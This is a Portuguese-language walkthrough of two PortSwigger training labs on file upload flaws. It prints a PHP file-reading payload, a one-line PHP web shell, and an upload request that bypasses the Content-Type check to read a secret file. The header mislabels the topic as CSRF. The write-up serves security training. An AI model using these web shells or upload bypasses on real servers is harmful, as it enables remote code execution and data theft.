---
title: "PortSwigger - File Upload Vulnerabilities"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de CSRF da PortSwigger"
keywords: ["PortSwigger", "File Upload", "Web shell", "Web Security"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: Remote code execution via web shell upload
"This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter"

1. Após autenticar-se como `wiener`, na funcionalidade de escolher arquivo para escolher a imagem para o avatar, não há nenhuma validação do tipo do arquivo.
2. Insira um arquivo com o seguinte payload:
```php
$filename = "/home/carlos/secret";
if (file_exists($filename)) {
    $content = file_get_contents($filename);
    echo $content;
} else {
    echo "File not found.";
}
```
3. Acesse o arquivo no caminho `/files/avatars/payload.php` e submeta a flag retornada.

## Lab: Web shell upload via Content-Type restriction bypass
"This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter"

1. Intercepte a requisição de envio da imagem de avatar e envie para o Repeater.
2. Altere o valor do `Content-Type` para `image/jpg` ou `image/png`, visto que esses são os tipos de arquivos permitidos (detectável pelo envio de um arquivo que não seja de imagem).
````
Content-Disposition: form-data; name="avatar"; filename="payload.php"
Content-Type: image/jpeg

<?php echo system($_GET['command']); ?>
````
3. Acesse o web shell para recuperar a flag:  `GET /files/avatars/payload.php?command=cat+/home/carlos/secret`
